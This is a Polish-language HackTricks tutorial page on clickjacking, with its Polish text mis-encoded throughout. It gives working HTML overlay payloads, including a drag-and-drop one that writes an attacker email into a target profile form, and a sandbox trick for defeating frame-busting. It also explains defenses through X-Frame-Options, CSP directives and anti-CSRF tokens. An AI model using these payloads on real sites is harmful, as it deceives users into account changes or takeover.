# Clickjacking

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… na HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** z wykorzystaniem najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ci.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Co to jest Clickjacking

W ataku clickjacking **uÅ¼ytkownik** jest **oszukany**, aby **kliknÄ…Ä‡** w **element** na stronie internetowej, ktÃ³ry jest albo **niewidoczny** albo przebrany za inny element. Ta manipulacja moÅ¼e prowadziÄ‡ do niezamierzonych konsekwencji dla uÅ¼ytkownika, takich jak pobieranie zÅ‚oÅ›liwego oprogramowania, przekierowanie na zÅ‚oÅ›liwe strony internetowe, podanie poÅ›wiadczeÅ„ dostÄ™pu lub poufnych informacji, transfery pieniÄ™Å¼ne lub zakupy online.

### Trik wypeÅ‚niania formularzy

Czasami moÅ¼liwe jest **wypeÅ‚nienie wartoÅ›ci pÃ³l formularza za pomocÄ… parametrÃ³w GET podczas Å‚adowania strony**. AtakujÄ…cy moÅ¼e wykorzystaÄ‡ to zachowanie, aby wypeÅ‚niÄ‡ formularz dowolnymi danymi i wysÅ‚aÄ‡ Å‚adunek clickjacking, aby uÅ¼ytkownik nacisnÄ…Å‚ przycisk WyÅ›lij.

### WypeÅ‚nij formularz za pomocÄ… przeciÄ…gnij i upuÅ›Ä‡

JeÅ›li potrzebujesz, aby uÅ¼ytkownik **wypeÅ‚niÅ‚ formularz**, ale nie chcesz bezpoÅ›rednio prosiÄ‡ go o wpisanie okreÅ›lonych informacji (takich jak e-mail i/lub konkretne hasÅ‚o, ktÃ³re znasz), moÅ¼esz poprosiÄ‡ go o **przeciÄ…gniÄ™cie i upuszczenie** czegoÅ›, co wpisze Twoje kontrolowane dane, jak w [**tym przykÅ‚adzie**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Podstawowy Å‚adunek
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Wieloetapowy Å‚adunek
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### PrzeciÄ…gnij i upuÅ›Ä‡ + Kliknij Å‚adunek
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

JeÅ›li zidentyfikowano **atak XSS, ktÃ³ry wymaga klikniÄ™cia przez uÅ¼ytkownika** w pewny element, aby **wywoÅ‚aÄ‡** XSS, a strona jest **podatna na clickjacking**, moÅ¼na to wykorzystaÄ‡, aby oszukaÄ‡ uÅ¼ytkownika, aby kliknÄ…Å‚ przycisk/link.\
PrzykÅ‚ad:\
_Znaleziono **self XSS** w pewnych prywatnych danych konta (dane, ktÃ³re **tylko ty moÅ¼esz ustawiÄ‡ i odczytaÄ‡**). Strona z **formularzem** do ustawienia tych danych jest **podatna** na **Clickjacking**, a moÅ¼na **wstÄ™pnie wypeÅ‚niÄ‡** **formularz** parametrami GET._\
\_\_AtakujÄ…cy mÃ³gÅ‚by przygotowaÄ‡ atak **Clickjacking** na tÄ™ stronÄ™, **wstÄ™pnie wypeÅ‚niajÄ…c** **formularz** **XSS payloadem** i **oszukujÄ…c** **uÅ¼ytkownika**, aby **zatwierdziÅ‚** formularz. Tak wiÄ™c, **gdy formularz zostanie przesÅ‚any** i wartoÅ›ci zostanÄ… zmodyfikowane, **uÅ¼ytkownik wykona XSS**.

## Strategie Å‚agodzenia Clickjacking

### Obrona po stronie klienta

Skrypty wykonywane po stronie klienta mogÄ… podejmowaÄ‡ dziaÅ‚ania w celu zapobieÅ¼enia Clickjacking:

* Upewnienie siÄ™, Å¼e okno aplikacji jest gÅ‚Ã³wnym lub najwyÅ¼szym oknem.
* Sprawienie, Å¼e wszystkie ramki sÄ… widoczne.
* Zapobieganie klikaniu w niewidoczne ramki.
* Wykrywanie i informowanie uÅ¼ytkownikÃ³w o potencjalnych prÃ³bach Clickjacking.

Jednak te skrypty Å‚amiÄ…ce ramki mogÄ… zostaÄ‡ obejÅ›cia:

* **Ustawienia bezpieczeÅ„stwa przeglÄ…darek:** NiektÃ³re przeglÄ…darki mogÄ… blokowaÄ‡ te skrypty na podstawie swoich ustawieÅ„ bezpieczeÅ„stwa lub braku obsÅ‚ugi JavaScript.
* **Atrybut HTML5 iframe `sandbox`:** AtakujÄ…cy moÅ¼e zneutralizowaÄ‡ skrypty Å‚amiÄ…ce ramki, ustawiajÄ…c atrybut `sandbox` z wartoÅ›ciami `allow-forms` lub `allow-scripts` bez `allow-top-navigation`. Zapobiega to ramce weryfikacji, czy jest najwyÅ¼szym oknem, np.,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
### Obrona po stronie serwera

#### X-Frame-Options

NagÅ‚Ã³wek odpowiedzi HTTP **`X-Frame-Options`** informuje przeglÄ…darki o legalnoÅ›ci renderowania strony w elemencie `<frame>` lub `<iframe>`, pomagajÄ…c w zapobieganiu Clickjackingowi:

- `X-Frame-Options: deny` - Å»adna domena nie moÅ¼e osadzaÄ‡ zawartoÅ›ci.
- `X-Frame-Options: sameorigin` - Tylko bieÅ¼Ä…ca witryna moÅ¼e osadzaÄ‡ zawartoÅ›Ä‡.
- `X-Frame-Options: allow-from https://trusted.com` - Tylko okreÅ›lony 'uri' moÅ¼e osadzaÄ‡ stronÄ™.
- NaleÅ¼y zauwaÅ¼yÄ‡ ograniczenia: jeÅ›li przeglÄ…darka nie obsÅ‚uguje tej dyrektywy, moÅ¼e nie dziaÅ‚aÄ‡. NiektÃ³re przeglÄ…darki preferujÄ… dyrektywÄ™ CSP frame-ancestors.

#### Dyrektywa frame-ancestors w polityce bezpieczeÅ„stwa zawartoÅ›ci (CSP)

**Dyrektywa `frame-ancestors` w CSP** jest zalecanÄ… metodÄ… ochrony przed Clickjackingiem:

- `frame-ancestors 'none'` - Podobne do `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Podobne do `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Podobne do `X-Frame-Options: allow-from`.

Na przykÅ‚ad, poniÅ¼sza CSP zezwala tylko na osadzanie z tej samej domeny:

`Content-Security-Policy: frame-ancestors 'self';`

SzczegÃ³Å‚owe informacje i przykÅ‚ady zastosowaÅ„ moÅ¼na znaleÅºÄ‡ w [dokumentacji CSP dotyczÄ…cej frame-ancestors](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) oraz [dokumentacji CSP frame-ancestors Mozilli](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Polityka bezpieczeÅ„stwa zawartoÅ›ci (CSP) z `child-src` i `frame-src`

**Polityka bezpieczeÅ„stwa zawartoÅ›ci (CSP)** to Å›rodek bezpieczeÅ„stwa, ktÃ³ry pomaga w zapobieganiu Clickjackingowi i innym atakom polegajÄ…cym na wstrzykiwaniu kodu, okreÅ›lajÄ…c, ktÃ³re ÅºrÃ³dÅ‚a przeglÄ…darka powinna zezwoliÄ‡ na Å‚adowanie zawartoÅ›ci.

#### Dyrektywa `frame-src`

- OkreÅ›la prawidÅ‚owe ÅºrÃ³dÅ‚a dla ramek.
- Jest bardziej szczegÃ³Å‚owa niÅ¼ dyrektywa `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ta polityka pozwala na ramki z tego samego pochodzenia (self) oraz https://trusted-website.com.

#### Dyrektywa `child-src`

* Wprowadzona w CSP poziomu 2 w celu ustawienia prawidÅ‚owych ÅºrÃ³deÅ‚ dla web workers i ramek.
* DziaÅ‚a jako opcja zapasowa dla frame-src i worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ta polityka pozwala na ramki i workery z tego samego pochodzenia (self) oraz https://trusted-website.com.

**Notatki dotyczÄ…ce uÅ¼ycia:**

* Dezaprobaty: child-src jest stopniowo eliminowany na rzecz frame-src i worker-src.
* Zachowanie zapasowe: JeÅ›li frame-src jest nieobecny, child-src jest uÅ¼ywany jako zapasowy dla ramek. JeÅ›li oba sÄ… nieobecne, uÅ¼ywane jest default-src.
* ÅšcisÅ‚a definicja ÅºrÃ³dÅ‚a: WÅ‚Ä…czaj tylko zaufane ÅºrÃ³dÅ‚a w dyrektywy, aby zapobiec eksploatacji.

#### Skrypty JavaScript do Å‚amania ramek

ChoÄ‡ nie sÄ… caÅ‚kowicie niezawodne, skrypty do Å‚amania ramek oparte na JavaScript mogÄ… byÄ‡ uÅ¼ywane do zapobiegania osadzaniu strony internetowej w ramce. PrzykÅ‚ad:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Wykorzystanie tokenÃ³w Anti-CSRF

* **Walidacja tokenÃ³w:** UÅ¼ywaj tokenÃ³w Anti-CSRF w aplikacjach internetowych, aby upewniÄ‡ siÄ™, Å¼e Å¼Ä…dania zmieniajÄ…ce stan sÄ… dokonywane celowo przez uÅ¼ytkownika, a nie poprzez stronÄ™ podatnÄ… na Clickjacking.

## Referencje

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ workflowy** zasilane przez najbardziej zaawansowane narzÄ™dzia spoÅ‚ecznoÅ›ciowe na Å›wiecie.\
ZdobÄ…dÅº dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
